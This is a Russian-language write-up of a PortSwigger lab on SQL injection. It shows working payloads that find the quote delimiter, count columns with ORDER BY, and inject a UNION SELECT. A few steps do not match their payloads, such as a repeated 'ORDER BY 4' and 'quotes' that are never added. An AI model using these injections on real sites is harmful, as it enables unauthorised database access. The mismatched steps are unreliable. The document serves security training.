# SQL injection UNION attack, determining the number of columns returned by the query

## Scope

[ссылка на лабу](https://portswigger.net/web-security/learning-paths/sql-injection/sql-injection-determining-the-number-of-columns-required/sql-injection/union-attacks/lab-determine-number-of-columns)

```
https://0a1600ed036880cd8c118c7100de00ed.web-security-academy.net/
```

В данной лабе есть уязвимый к [[SQL injection]] фильтр категории.

Для решения лабы необходимо выполнить атаку, которая должна вывести дополнительную строку с `NULL` значениями.

## Notes

Первым делом нужно найти фильтр категорий, который описан в задании. Это сделать достаточно легко, так как он находится на главной странице и значения для фильтрации передаются через параметры `GET`-запроса.

![](../images/Pasted%20image%2020250118174935.png)

```
https://0a1600ed036880cd8c118c7100de00ed.web-security-academy.net/filter?category=Accessories
```

Теперь нужно найти символ обрамления для параметра. Предположим, что запрос выглядит следующим образом:

```SQL
SELECT name, price FROM table WHERE category = 'Accessories'
```

Предположу, что для обрамления используется символ кавычки `'`, тогда я не должен получить никаких значений при следующем запросе:

```
https://0a1600ed036880cd8c118c7100de00ed.web-security-academy.net/filter?category=Accessories' and false-- -
```

Собственно это и произошло:

![](../images/Pasted%20image%2020250118175407.png)

Запрос к БД выглядел следующим образом:

```SQL
SELECT name, price FROM table WHERE category = 'Accessories' and false -- -'
```

`-- -` - это комментарий в `SQL`, с помощью я убрал всю последующую часть запроса, в текущем случае, это лишняя кавычка, которая ломала бы запрос;

Обрамления я нашел - это одинарные кавычки `'`. Теперь нужно найти количество элементов в запросе. Это можно сделать с помощью `ORDER BY`. Этот оператор используется для сортировки результата по номеру стоблца в БД. Если нужного столбца нет, то мы получим ошибку. Подставлю значение 100.

```
https://0a1600ed036880cd8c118c7100de00ed.web-security-academy.net/filter?category=Accessories%27%20ORDER%20BY%20100--%20-
```

Ошибка)

![](../images/Pasted%20image%2020250118180147.png)

Далее можно использовать бинарный поиск, для нахождения нужного значения. Т.е. передать 50. В случае ошибки взять 25, если же успех, то 75. И так далее. Можно так же ткнуть на обум. На сайте мы видим 3 колонки. Звучит логично, что они все заполняются из БД. Подставлю значение 4. Для сокращения буду писать только часть пейлоада.

```
Accessories' ORDER BY 4-- -
```

![](../images/Pasted%20image%2020250118180405.png)

Подставлю 3:

```
Accessories' ORDER BY 4-- -
```

Супер. ~~Сбер теперь купер~~.

![](../images/Pasted%20image%2020250118180513.png)
 
 Я нашел количество столбцов. Попробую добавить `UNION` к своему пейлоаду, чтобы получить данные из БД:
  
```
Accessories' UNION SELECT 1,2,3-- -
```

Ошибка(

![](../images/Pasted%20image%2020250118180901.png)

Оберну значения в кавычки:

```
Accessories' and false UNION SELECT 1,2,3-- -
```

![](../images/Pasted%20image%2020250118180835.png)

Я вывел переданные значения в таблицу на сайте, что и требовалось для прохождения лабы.
